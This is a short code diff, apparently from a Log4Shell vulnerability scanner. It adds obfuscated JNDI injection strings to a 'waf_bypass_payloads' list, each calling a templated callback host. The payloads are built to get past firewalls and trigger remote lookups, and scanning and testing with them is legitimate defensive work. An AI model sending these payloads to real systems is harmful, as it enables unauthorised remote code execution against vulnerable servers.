@@ -72,7 +72,13 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
-                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}",
+                       "${jndi${nagli:-:}ldap:${::-/}/${{callback_host}}/a}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}/{{random}}}",
+                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/",
+                       "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
